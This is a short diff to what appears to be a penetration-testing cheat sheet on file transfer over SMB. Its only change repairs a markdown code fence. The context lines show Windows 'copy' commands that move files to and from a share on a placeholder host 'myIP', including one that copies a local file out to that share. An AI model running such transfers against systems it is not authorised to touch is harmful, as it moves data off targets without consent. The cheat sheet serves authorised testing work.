@@ -15,7 +15,7 @@ copy .\file.ext \\myIP\share\file.ext
 Copy to a Windows Target
 ```bash
 copy \\myIP\share\file.ext .\file.ext
-``
+```
 Make sure to stop the SMBserver after transfer because everybody in that network has access to your SMBserver
 
 ## Base64
